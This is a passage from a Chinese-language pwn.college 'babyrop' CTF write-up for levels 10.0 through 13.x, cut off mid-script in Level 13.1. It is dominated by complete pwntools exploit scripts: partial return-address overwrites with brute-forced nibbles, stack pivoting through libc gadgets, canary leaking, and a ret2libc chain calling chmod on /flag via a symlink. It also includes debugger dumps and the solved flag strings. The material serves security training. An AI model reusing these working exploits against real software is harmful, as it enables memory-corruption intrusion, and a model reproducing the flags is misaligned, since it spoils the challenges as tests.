0x7ffd39e82958: 0x00000001bee9a191 0x00007873bf78b000
0x7ffd39e82968: 0x4141414141414141 0x4141414141414141
0x7ffd39e82978: 0x4141414141414141 0x4141414141414141
0x7ffd39e82988: 0x4141414141414141 0x4141414141414141
0x7ffd39e82998: 0x4141414141414141 0x4141414141414141
```

## Exploit

```python
#!/usr/bin/python3

from pwn import (
    ELF,
    ROP,
    context,
    flat,
    gdb,
    log,
    p8,
    process,
    random,
    remote,
)

context(log_level="debug", terminal="kitty")

FILE = "./babyrop_level10.0"
HOST, PORT = "localhost", 1337

gdbscript = """
b *challenge+703
c
"""


def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    if local:
        global elf

        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug(
                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
            )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


def send_payload(target, payload):
    try:
        target.send(payload)
    except Exception as e:
        log.exception(f"An error occurred while sending payload: {e}")


def construct_payload(leaked_addr):
    rop = ROP(elf)

    padding_to_rbp = b"".ljust(0x78, b"A")

    leave_ret = rop.leave.address

    leave_ret_fixed_low_byte = p8(leave_ret & 0xFF)
    leave_ret_fixed_high_nibble = (leave_ret >> 0x8) & ~(1 << 4)
    leave_ret_possible_high_bytes = [
        p8(leave_ret_fixed_high_nibble + i) for i in range(0x00, 0x100, 0x10)
    ]

    payload = padding_to_rbp
    payload += flat(
        leaked_addr - 0x10,
        leave_ret_fixed_low_byte + random.choice(leave_ret_possible_high_bytes),
    )

    return payload


def leak(target):
    target.recvuntil(b"located at: ")

    return int(target.recv(0xE), 16)


def attack(target, payload):
    try:
        send_payload(target, payload)

        response = target.recvall(timeout=3)

        if b"pwn.college{" in response:
            return True
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    while True:
        try:
            target = launch(debug=False)
            payload = construct_payload(leak(target))

            if attack(target, payload):
                exit()
        except Exception as e:
            log.exception(f"An error occurred in main: {e}")


if __name__ == "__main__":
    main()
```

## Flag

Flag: `pwn.college{g4EQhfj4W4pI_g9tDdWlqPAdtK2.0VO1MDL5cTNxgzW}`

# Level 10.1

## Information

- Category: Pwn

## Description

> Perform a partial overwrite to call the win function.

## Write-up

参见 [Level 10.0](#level-100)。

## Exploit

```python
#!/usr/bin/python3

from pwn import (
    ELF,
    ROP,
    context,
    flat,
    gdb,
    log,
    p8,
    process,
    random,
    remote,
)

context(log_level="debug", terminal="kitty")

FILE = "./babyrop_level10.1"
HOST, PORT = "localhost", 1337

gdbscript = """
c
"""


def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    if local:
        global elf

        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug(
                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
            )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


def send_payload(target, payload):
    try:
        target.send(payload)
    except Exception as e:
        log.exception(f"An error occurred while sending payload: {e}")


def construct_payload(leaked_addr):
    rop = ROP(elf)

    padding_to_rbp = b"".ljust(0x78, b"A")

    leave_ret = rop.leave.address

    leave_ret_fixed_low_byte = p8(leave_ret & 0xFF)
    leave_ret_fixed_high_nibble = (leave_ret >> 0x8) & ~(1 << 4)
    leave_ret_possible_high_bytes = [
        p8(leave_ret_fixed_high_nibble + i) for i in range(0x00, 0x100, 0x10)
    ]

    payload = padding_to_rbp
    payload += flat(
        leaked_addr - 0x10,
        leave_ret_fixed_low_byte + random.choice(leave_ret_possible_high_bytes),
    )

    return payload


def leak(target):
    target.recvuntil(b"located at: ")

    return int(target.recv(0xE), 16)


def attack(target, payload):
    try:
        send_payload(target, payload)

        response = target.recvall(timeout=3)

        if b"pwn.college{" in response:
            return True
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    while True:
        try:
            target = launch(debug=False)
            payload = construct_payload(leak(target))

            if attack(target, payload):
                exit()
        except Exception as e:
            log.exception(f"An error occurred in main: {e}")


if __name__ == "__main__":
    main()
```

## Flag

Flag: `pwn.college{kq62r2gqRuS8CCZ5IsBJ4-OK_E-.0FM2MDL5cTNxgzW}`

# Level 11.0

## Information

- Category: Pwn

## Description

> Perform a partial overwrite to call the win function.

## Write-up

一眼题目结构和上题类似？好像没有区别吧……

看看，好的思路和 exp 是可以拿来反复秒题的 LMAO

唯有一点我不太懂，你这是何必呢？

![](https://jsd.cdn.zzko.cn/gh/CuB3y0nd/picx-images-hosting@master/.9rjp4q6h43.avif)

## Exploit

```python
#!/usr/bin/python3

from pwn import (
    ELF,
    ROP,
    context,
    flat,
    gdb,
    log,
    p8,
    process,
    random,
    remote,
)

context(log_level="debug", terminal="kitty")

FILE = "./babyrop_level11.0"
HOST, PORT = "localhost", 1337

gdbscript = """
c
"""


def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    if local:
        global elf

        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug(
                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
            )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


def send_payload(target, payload):
    try:
        target.send(payload)
    except Exception as e:
        log.exception(f"An error occurred while sending payload: {e}")


def construct_payload(leaked_addr):
    rop = ROP(elf)

    padding_to_rbp = b"".ljust(0x88, b"A")

    leave_ret = rop.leave.address

    leave_ret_fixed_low_byte = p8(leave_ret & 0xFF)
    leave_ret_fixed_high_nibble = (leave_ret >> 0x8) & ~(1 << 4)
    leave_ret_possible_high_bytes = [
        p8(leave_ret_fixed_high_nibble + i) for i in range(0x00, 0x100, 0x10)
    ]

    payload = padding_to_rbp
    payload += flat(
        leaked_addr - 0x10,
        leave_ret_fixed_low_byte + random.choice(leave_ret_possible_high_bytes),
    )

    return payload


def leak(target):
    target.recvuntil(b"located at: ")

    return int(target.recv(0xE), 16)


def attack(target, payload):
    try:
        send_payload(target, payload)

        response = target.recvall(timeout=3)

        if b"pwn.college{" in response:
            return True
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    while True:
        try:
            target = launch(debug=False)
            payload = construct_payload(leak(target))

            if attack(target, payload):
                exit()
        except Exception as e:
            log.exception(f"An error occurred in main: {e}")


if __name__ == "__main__":
    main()
```

## Flag

Flag: `pwn.college{ogFd_c22L6ok_8m23oykWyxLfn9.0VM2MDL5cTNxgzW}`

# Level 11.1

## Information

- Category: Pwn

## Description

> Perform a partial overwrite to call the win function.

## Write-up

参见 [Level 10](#level-100)。

## Exploit

```python
#!/usr/bin/python3

from pwn import (
    ELF,
    ROP,
    context,
    flat,
    gdb,
    log,
    p8,
    process,
    random,
    remote,
)

context(log_level="debug", terminal="kitty")

FILE = "./babyrop_level11.1"
HOST, PORT = "localhost", 1337

gdbscript = """
c
"""


def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    if local:
        global elf

        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug(
                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
            )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


def send_payload(target, payload):
    try:
        target.send(payload)
    except Exception as e:
        log.exception(f"An error occurred while sending payload: {e}")


def construct_payload(leaked_addr):
    rop = ROP(elf)

    padding_to_rbp = b"".ljust(0x38, b"A")

    leave_ret = rop.leave.address

    leave_ret_fixed_low_byte = p8(leave_ret & 0xFF)
    leave_ret_fixed_high_nibble = (leave_ret >> 0x8) & ~(1 << 4)
    leave_ret_possible_high_bytes = [
        p8(leave_ret_fixed_high_nibble + i) for i in range(0x00, 0x100, 0x10)
    ]

    payload = padding_to_rbp
    payload += flat(
        leaked_addr - 0x10,
        leave_ret_fixed_low_byte + random.choice(leave_ret_possible_high_bytes),
    )

    return payload


def leak(target):
    target.recvuntil(b"located at: ")

    return int(target.recv(0xE), 16)


def attack(target, payload):
    try:
        send_payload(target, payload)

        response = target.recvall(timeout=3)

        if b"pwn.college{" in response:
            return True
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    while True:
        try:
            target = launch(debug=False)
            payload = construct_payload(leak(target))

            if attack(target, payload):
                exit()
        except Exception as e:
            log.exception(f"An error occurred in main: {e}")


if __name__ == "__main__":
    main()
```

## Flag

Flag: `pwn.college{oSzRHWf3oNfOmzKglfN7pBOGmyY.0lM2MDL5cTNxgzW}`

# Level 12.0

## Information

- Category: Pwn

## Description

> Creatively apply stack pivoting to call the win function.

## Write-up

~_根据 Description，我们可以推测出 CuB3y0nd 是一位非常有 Creativity 的 Hacker，直接复用 [Level 10](#level-10) 的 exp 秒了 [Level 11](#level-11) 和 [Level 12](#level-12)。每道题修改 exp 不超过 4 bytes_~

写完一看 WTF! 这次 exp 跑了那么久没跑通……BRO MAKES ME SO MAD……~_你一定没看见上面那句话吧，你肯定看不见……_~

让我看看到底是怎么个事：

```plaintext wrap=false showLineNumbers=false ins="0x000000000000171e : leave ; ret"
λ ~/Projects/pwn.college/ ROPgadget --binary babyrop_level12.0 --re "leave"
Gadgets information
============================================================
0x00000000000022b2 : add byte ptr [rax], al ; add byte ptr [rax], al ; leave ; ret
0x00000000000022b4 : add byte ptr [rax], al ; leave ; ret
0x000000000000171e : leave ; ret
0x00000000000022b1 : mov eax, 0 ; leave ; ret
0x000000000000178b : nop ; leave ; ret

Unique gadgets found: 5
```

```asm wrap=false showLineNumbers=false collapse={2-20, 28-53}
Breakpoint 1, 0x00005978a812a2b7 in main ()
------- tip of the day (disable with set show-tips off) -------
Use the spray command to spray memory with cyclic pattern or specified value
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────
 RAX  0
 RBX  0x7ffe6ec57aa8 —▸ 0x7ffe6ec58633 ◂— '/home/cub3y0nd/Projects/pwn.college/babyrop_level12.0'
 RCX  0x7e9cf1d1b7a4 (write+20) ◂— cmp rax, -0x1000 /* 'H=' */
 RDX  0
 RDI  0x7e9cf1df8710 ◂— 0
 RSI  0x7e9cf1df7643 (_IO_2_1_stdout_+131) ◂— 0xdf8710000000000a /* '\n' */
 R8   0x78
 R9   0xfffffff2
 R10  0
 R11  0x202
 R12  1
 R13  0
 R14  0x7e9cf25ef000 (_rtld_global) —▸ 0x7e9cf25f02e0 —▸ 0x5978a8128000 ◂— 0x10102464c457f
 R15  0
 RBP  0x7ffe6ec57a20 —▸ 0x7ffe6ec57a80 ◂— 0
 RSP  0x7ffe6ec57988 —▸ 0x7e9cf1c34e08 ◂— mov edi, eax
 RIP  0x5978a812a2b7 (main+912) ◂— ret
────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────
 ► 0x5978a812a2b7 <main+912>    ret                                <0x7e9cf1c34e08>
    ↓
   0x7e9cf1c34e08               mov    edi, eax     EDI => 0
   0x7e9cf1c34e0a               call   exit                        <exit>

   0x7e9cf1c34e0f               call   0x7e9cf1c9ffa0              <0x7e9cf1c9ffa0>

   0x7e9cf1c34e14               lock sub dword ptr [rip + 0x1c12b4], 1
   0x7e9cf1c34e1c               je     0x7e9cf1c34e38              <0x7e9cf1c34e38>

   0x7e9cf1c34e1e               mov    edx, 0x3c                   EDX => 0x3c
   0x7e9cf1c34e23               nop    word ptr cs:[rax + rax]
   0x7e9cf1c34e2e               nop
   0x7e9cf1c34e30               xor    edi, edi                    EDI => 0
   0x7e9cf1c34e32               mov    eax, edx
─────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7ffe6ec57988 —▸ 0x7e9cf1c34e08 ◂— mov edi, eax
01:0008│-090 0x7ffe6ec57990 —▸ 0x7ffe6ec579d0 —▸ 0x7e9cf25ef000 (_rtld_global) —▸ 0x7e9cf25f02e0 —▸ 0x5978a8128000 ◂— ...
02:0010│-088 0x7ffe6ec57998 —▸ 0x7ffe6ec57aa8 —▸ 0x7ffe6ec58633 ◂— '/home/cub3y0nd/Projects/pwn.college/babyrop_level12.0'
03:0018│-080 0x7ffe6ec579a0 ◂— 0x1a8128040
04:0020│-078 0x7ffe6ec579a8 —▸ 0x5978a8129f27 (main) ◂— endbr64
05:0028│-070 0x7ffe6ec579b0 —▸ 0x7ffe6ec57aa8 —▸ 0x7ffe6ec58633 ◂— '/home/cub3y0nd/Projects/pwn.college/babyrop_level12.0'
06:0030│-068 0x7ffe6ec579b8 ◂— 0xedc16b49efc02286
07:0038│-060 0x7ffe6ec579c0 ◂— 1
───────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────
 ► 0   0x5978a812a2b7 main+912
   1   0x7e9cf1c34e08
   2   0x7e9cf1c34ecc __libc_start_main+140
   3   0x5978a812926e _start+46
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> vmmap 0x7e9cf1c34e08
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size Offset File
    0x7e9cf1c0f000     0x7e9cf1c33000 r--p    24000      0 /usr/lib/libc.so.6
►   0x7e9cf1c33000     0x7e9cf1da4000 r-xp   171000  24000 /usr/lib/libc.so.6 +0x1e08
    0x7e9cf1da4000     0x7e9cf1df2000 r--p    4e000 195000 /usr/lib/libc.so.6
pwndbg> x/2i 0x7e9cf1c3471e
   0x7e9cf1c3471e: mov    eax,DWORD PTR [rbp-0x38]
   0x7e9cf1c34721: sub    rax,QWORD PTR fs:0x28
pwndbg>
```

难怪打不通，原来是因为这个 Level 没有 `challenge` 函数了，这个 Level 只有一个 `main` 函数，所以会返回到 `libc` 中。而之前有 `challenge` 函数的时候会返回到 `main`，所以我们才可以用 binary 的 `gadgets`，但这次返回到 `libc` 了自然就不能用 binary 的 gadgets 了，必须找 `libc` 中可用的 gadgets。

```plaintext wrap=false showLineNumbers=false ins="0x000000000002556a : leave ; ret"
λ ~/Projects/pwn.college/ ROPgadget --binary /usr/lib/libc.so.6 --re "leave" --depth=3
Gadgets information
============================================================
  <snip>
0x0000000000026042 : leave ; jmp rax
0x0000000000188253 : leave ; jmp rcx
0x00000000000fe0c8 : leave ; notrack jmp rcx
0x000000000002556a : leave ; ret
0x00000000000ea14b : leave ; retf
0x000000000003bcee : movq mm0, mm2 ; leave ; ret
0x0000000000040f4e : pop rax ; leave ; ret
  <snip>

Unique gadgets found: 190
```

```asm wrap=false showLineNumbers=false
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size Offset File
    0x5978a8128000     0x5978a8129000 r--p     1000      0 /home/cub3y0nd/Projects/pwn.college/babyrop_level12.0
    0x5978a8129000     0x5978a812b000 r-xp     2000   1000 /home/cub3y0nd/Projects/pwn.college/babyrop_level12.0
    0x5978a812b000     0x5978a812c000 r--p     1000   3000 /home/cub3y0nd/Projects/pwn.college/babyrop_level12.0
    0x5978a812c000     0x5978a812d000 r--p     1000   3000 /home/cub3y0nd/Projects/pwn.college/babyrop_level12.0
    0x5978a812d000     0x5978a812e000 rw-p     1000   4000 /home/cub3y0nd/Projects/pwn.college/babyrop_level12.0
    0x7e9cf1c0f000     0x7e9cf1c33000 r--p    24000      0 /usr/lib/libc.so.6
    0x7e9cf1c33000     0x7e9cf1da4000 r-xp   171000  24000 /usr/lib/libc.so.6
    0x7e9cf1da4000     0x7e9cf1df2000 r--p    4e000 195000 /usr/lib/libc.so.6
    0x7e9cf1df2000     0x7e9cf1df6000 r--p     4000 1e3000 /usr/lib/libc.so.6
    0x7e9cf1df6000     0x7e9cf1df8000 rw-p     2000 1e7000 /usr/lib/libc.so.6
    0x7e9cf1df8000     0x7e9cf1e00000 rw-p     8000      0 [anon_7e9cf1df8]
    0x7e9cf1e00000     0x7e9cf1e07000 r--p     7000      0 /usr/lib/libcapstone.so.5
    0x7e9cf1e07000     0x7e9cf1edd000 r-xp    d6000   7000 /usr/lib/libcapstone.so.5
    0x7e9cf1edd000     0x7e9cf23b3000 r--p   4d6000  dd000 /usr/lib/libcapstone.so.5
    0x7e9cf23b3000     0x7e9cf24f5000 r--p   142000 5b3000 /usr/lib/libcapstone.so.5

    0x7e9cf24f5000     0x7e9cf24f6000 rw-p     1000 6f5000 /usr/lib/libcapstone.so.5
    0x7e9cf2585000     0x7e9cf258a000 rw-p     5000      0 [anon_7e9cf2585]
    0x7e9cf25b2000     0x7e9cf25b3000 r-xp     1000      0 [anon_7e9cf25b2]
    0x7e9cf25b3000     0x7e9cf25b7000 r--p     4000      0 [vvar]
    0x7e9cf25b7000     0x7e9cf25b9000 r-xp     2000      0 [vdso]
    0x7e9cf25b9000     0x7e9cf25ba000 r--p     1000      0 /usr/lib/ld-linux-x86-64.so.2
    0x7e9cf25ba000     0x7e9cf25e3000 r-xp    29000   1000 /usr/lib/ld-linux-x86-64.so.2
    0x7e9cf25e3000     0x7e9cf25ed000 r--p     a000  2a000 /usr/lib/ld-linux-x86-64.so.2
    0x7e9cf25ed000     0x7e9cf25ef000 r--p     2000  34000 /usr/lib/ld-linux-x86-64.so.2
    0x7e9cf25ef000     0x7e9cf25f1000 rw-p     2000  36000 /usr/lib/ld-linux-x86-64.so.2
    0x7ffe6ec38000     0x7ffe6ec59000 rw-p    21000      0 [stack]
0xffffffffff600000 0xffffffffff601000 --xp     1000      0 [vsyscall]
pwndbg> x/2i 0x7e9cf1c0f000+0x000000000002556a
   0x7e9cf1c3456a <warn+185>: leave
   0x7e9cf1c3456b <warn+186>: ret
pwndbg>
```

嗯……理论上我们爆破 5 nibbles 必定可以成功，但实际上我们很幸运，在默认返回地址附近存在可用的 gadgets 来实现栈迁移，所以最终我们只需爆破 3 nibbles 就好了。

## Exploit

```python
#!/usr/bin/python3

from pwn import (
    ELF,
    context,
    flat,
    gdb,
    log,
    process,
    random,
    remote,
)

context(log_level="debug", terminal="kitty")

FILE = "./babyrop_level12.0"
HOST, PORT = "localhost", 1337

gdbscript = """
b *main+912
c
"""


def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    if local:
        global elf

        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug(
                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
            )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


def send_payload(target, payload):
    try:
        target.send(payload)
    except Exception as e:
        log.exception(f"An error occurred while sending payload: {e}")


def random_nibbles():
    return random.randint(0x0000, 0xFFFF).to_bytes(2, "little")


def leak(target):
    target.recvuntil(b"located at: ")

    return int(target.recv(0xE), 16)


def construct_payload(leaked_addr):
    padding_to_rbp = b"".ljust(0x68, b"A")

    payload = padding_to_rbp
    payload += flat(
        leaked_addr - 0x10,
        random_nibbles(),
    )

    return payload


def attack(target, payload):
    try:
        send_payload(target, payload)

        response = target.recvall(timeout=3)

        if b"pwn.college{" in response:
            return True
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    while True:
        target = None

        try:
            target = launch(debug=False)
            payload = construct_payload(leak(target))

            if attack(target, payload):
                exit()
        except Exception as e:
            log.exception(f"An error occurred in main: {e}")
        finally:
            if target is not None:
                target.close()


if __name__ == "__main__":
    main()
```

## Flag

Flag: `pwn.college{Yq8SiIRAxHtJeQWDahvT9Q5y0pE.01M2MDL5cTNxgzW}`

# Level 12.1

## Information

- Category: Pwn

## Description

> Creatively apply stack pivoting to call the win function.

## Write-up

参见 [Level 12.0](#level-120)。

## Exploit

```python
#!/usr/bin/python3

from pwn import (
    ELF,
    context,
    flat,
    gdb,
    log,
    process,
    random,
    remote,
)

context(log_level="debug", terminal="kitty")

FILE = "./babyrop_level12.1"
HOST, PORT = "localhost", 1337

gdbscript = """
c
"""


def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    if local:
        global elf

        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug(
                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
            )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


def send_payload(target, payload):
    try:
        target.send(payload)
    except Exception as e:
        log.exception(f"An error occurred while sending payload: {e}")


def random_nibbles():
    return random.randint(0x0000, 0xFFFF).to_bytes(2, "little")


def leak(target):
    target.recvuntil(b"located at: ")

    return int(target.recv(0xE), 16)


def construct_payload(leaked_addr):
    padding_to_rbp = b"".ljust(0x58, b"A")

    payload = padding_to_rbp
    payload += flat(
        leaked_addr - 0x10,
        random_nibbles(),
    )

    return payload


def attack(target, payload):
    try:
        send_payload(target, payload)

        response = target.recvall(timeout=3)

        if b"pwn.college{" in response:
            return True
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    while True:
        target = None

        try:
            target = launch(debug=False)
            payload = construct_payload(leak(target))

            if attack(target, payload):
                exit()
        except Exception as e:
            log.exception(f"An error occurred in main: {e}")
        finally:
            if target is not None:
                target.close()


if __name__ == "__main__":
    main()
```

## Flag

Flag: `pwn.college{4358dHEnXGJJC945avk1i2By5c6.0FN2MDL5cTNxgzW}`

# Level 13.0

## Information

- Category: Pwn

## Description

> Perform ROP when the function has a canary!

## Write-up

```c ins={52, 56-58} del={59} collapse={1-48, 63-67}
int __fastcall main(int argc, const char **argv, const char **envp)
{
  __int64 v4; // [rsp+0h] [rbp-A0h] BYREF
  const char **v5; // [rsp+8h] [rbp-98h]
  const char **v6; // [rsp+10h] [rbp-90h]
  int v7; // [rsp+1Ch] [rbp-84h]
  int v8; // [rsp+28h] [rbp-78h]
  int v9; // [rsp+2Ch] [rbp-74h]
  const void *v10[3]; // [rsp+30h] [rbp-70h] BYREF
  __int64 v11; // [rsp+48h] [rbp-58h]
  _BYTE buf[72]; // [rsp+50h] [rbp-50h] BYREF
  unsigned __int64 v13; // [rsp+98h] [rbp-8h]
  __int64 savedregs; // [rsp+A0h] [rbp+0h] BYREF
  _UNKNOWN *retaddr; // [rsp+A8h] [rbp+8h] BYREF

  v7 = argc;
  v6 = argv;
  v5 = envp;
  v13 = __readfsqword(0x28u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  v8 = argc;
  v10[1] = argv;
  v10[2] = v5;
  puts(
    "This challenge reads in some bytes, overflows its stack, and allows you to perform a ROP attack. Through this series of");
  puts("challenges, you will become painfully familiar with the concept of Return Oriented Programming!\n");
  sp_ = (__int64)&v4;
  bp_ = (__int64)&savedregs;
  sz_ = ((unsigned __int64)((char *)&savedregs - (char *)&v4) >> 3) + 2;
  rp_ = (__int64)&retaddr;
  puts(
    "PIE is turned on! This means that you do not know where any of the gadgets in the main binary are. However, you can do a");
  puts(
    "partial overwrite of the saved instruction pointer in order to execute 1 gadget! If that saved instruction pointer goes");
  puts(
    "to libc, you will need to ROP from there. If that saved instruction pointer goes to the main binary, you will need to");
  puts(
    "ROP from there. You may need need to execute your payload several times to account for the randomness introduced. This");
  puts("might take anywhere from 0-12 bits of bruteforce depending on the scenario.\n");
  puts("ASLR means that the address of the stack is not known,");
  puts("but I will simulate a memory disclosure of it.");
  puts("By knowing where the stack is, you can now reference data");
  puts("that you write onto the stack.");
  puts("Be careful: this data could trip up your ROP chain,");
  puts("because it could be interpreted as return addresses.");
  puts("You can use gadgets that shift the stack appropriately to avoid that.");
  printf("[LEAK] Your input buffer is located at: %p.\n\n", buf);
  puts("This will simulate an 8-byte arbitrary read.");
  v10[0] = 0LL;
  puts("Address in hex to read from:");
  __isoc99_scanf("%p", v10);
  v11 = *(_QWORD *)v10[0];
  printf("[LEAK] *%p = 0x%016llx\n\n", v10[0], v11);
  v9 = read(0, buf, 0x1000uLL);
  printf("Received %d bytes! This is potentially %d gadgets.\n", v9, (unsigned __int64)&buf[v9 - rp_] >> 3);
  puts("Let's take a look at your chain! Note that we have no way to verify that the gadgets are executable");
  puts("from within this challenge. You will have to do that by yourself.");
  print_chain(rp_, (unsigned int)((unsigned __int64)&buf[v9 - rp_] >> 3) + 1);
  puts("Leaving!");
  puts("### Goodbye!");
  return 0;
}
```

这题不难吧，标绿部分模拟了一个泄漏，我们可以通过它把 canary 泄漏出来。之后我们想办法返回到 `__libc_start_main` 再次调用 `main` 函数，泄漏一个 `libc` 地址出来，计算 `libc` 基址，有了基址就可以去构造 ROP Chain 了。

## Exploit

```python
#!/usr/bin/python3

from pwn import (
    ELF,
    ROP,
    context,
    flat,
    gdb,
    log,
    os,
    p8,
    process,
    random,
    remote,
)

context(log_level="debug", terminal="kitty")

FILE = "./babyrop_level13.0"
HOST, PORT = "localhost", 1337

gdbscript = """
b *main+770
c
"""

CANARY_OFFSET = 0x48
RET_OFFSET = 0x58
LIBC_OFFSET = 0x24083


def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    if local:
        global elf

        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug(
                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
            )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


def leak(target, offset, info_type):
    target.recvuntil(b"located at: ")
    leaked_addr = int(target.recvline().rstrip(b".\n"), 16) + offset

    target.sendline(hex(leaked_addr).encode("ascii"))
    target.recvuntil(b"[LEAK]")

    if info_type == "canary":
        return int(target.recvline()[21:], 16)
    elif info_type == "libc_base":
        return int(target.recvline()[21:], 16)
    else:
        log.error(b"Invalid info type!")


def construct_payload(stage, canary, libc_base=None):
    if stage == 1:
        __libc_start_main_fixed_low_byte = b"\x90"
        __libc_start_main_high_byte_candidates = [
            p8(i) for i in range(0x0F, 0x10F, 0x10)
        ]

        return flat(
            b"".ljust(CANARY_OFFSET, b"A"),
            canary,
            b"".ljust(0x8, b"A"),
            __libc_start_main_fixed_low_byte
            + random.choice(__libc_start_main_high_byte_candidates),
        )
    elif stage == 2:
        if libc_base is None:
            log.failure("libc_base is required for stage 2!")
            exit()

        local_libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
        local_libc.address = libc_base - LIBC_OFFSET

        rop = ROP(local_libc)

        pop_rdi_ret = rop.rdi.address
        pop_rsi_ret = rop.rsi.address

        filename = next(local_libc.search(b"GNU"))
        mode = 0o4

        return flat(
            b"".ljust(CANARY_OFFSET, b"A"),
            canary,
            b"".ljust(0x8, b"A"),
            pop_rdi_ret,
            filename,
            pop_rsi_ret,
            mode,
            local_libc.symbols["chmod"],
        )
    else:
        log.error(b"Invalid stage number!")


def attack(target):
    try:
        os.system("ln -s /flag GNU")

        leaked_canary = leak(target, CANARY_OFFSET, "canary")
        payload = construct_payload(1, leaked_canary)

        target.send(payload)

        try:
            response = target.recvuntil(b"Welcome to (null)!", timeout=0.1)

            if b"Welcome to (null)!" in response:
                payload = construct_payload(
                    2, leaked_canary, leak(target, RET_OFFSET, "libc_base")
                )

                target.send(payload)
        except Exception as e:
            log.failure(f"String not detected in this turn. {e}")

        target.recvall(timeout=3)

        try:
            with open("/flag", "r") as f:
                log.success(f.read())
            return True
        except FileNotFoundError:
            log.exception("The file '/flag' does not exist.")
        except PermissionError:
            log.failure("Permission denied to read '/flag'.")
        except Exception as e:
            log.exception(f"An error occurred while performing attack: {e}")
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    while True:
        target = None

        try:
            target = launch(debug=False)

            if attack(target):
                exit()
        except Exception as e:
            log.exception(f"An error occurred in main: {e}")
        finally:
            if target is not None:
                target.close()


if __name__ == "__main__":
    main()
```

## Flag

Flag: `pwn.college{Mw9zt3eeAB8_8it-_3_NRUzoHRA.0VN2MDL5cTNxgzW}`

# Level 13.1

## Information

- Category: Pwn

## Description

> Perform ROP when the function has a canary!

## Write-up

参见 [Level 13.0](#level-130)。

## Exploit

```python
#!/usr/bin/python3

from pwn import (
    ELF,
    ROP,
    context,
    flat,
    gdb,
    log,
    os,
    p8,
    process,
    random,
    remote,
)

context(log_level="debug", terminal="kitty")

FILE = "./babyrop_level13.1"
HOST, PORT = "localhost", 1337

gdbscript = """
c
"""

CANARY_OFFSET = 0x78
RET_OFFSET = 0x88
LIBC_OFFSET = 0x24083


def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    if local:
        global elf

        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug(
                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
            )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


def leak(target, offset, info_type):
    target.recvuntil(b"located at: ")
    leaked_addr = int(target.recvline().rstrip(b".\n"), 16) + offset

    target.sendline(hex(leaked_addr).encode("ascii"))
    target.recvuntil(b"[LEAK]")

    if info_type == "canary":
        return int(target.recvline()[21:], 16)
    elif info_type == "libc_base":
        return int(target.recvline()[21:], 16)
    else:
        log.error(b"Invalid info type!")


def construct_payload(stage, canary, libc_base=None):
    if stage == 1:
        __libc_start_main_fixed_low_byte = b"\x90"
        __libc_start_main_high_byte_candidates = [
            p8(i) for i in range(0x0F, 0x10F, 0x10)
        ]

        return flat(
            b"".ljust(CANARY_OFFSET, b"A"),
            canary,
            b"".ljust(0x8, b"A"),
            __libc_start_main_fixed_low_byte
            + random.choice(__libc_start_main_high_byte_candidates),
        )
    elif stage == 2:
        if libc_base is None:
            log.failure("libc_base is required for stage 2!")
            exit()

        local_libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
        local_libc.address = libc_base - LIBC_OFFSET

        rop = ROP(local_libc)

        pop_rdi_ret = rop.rdi.address
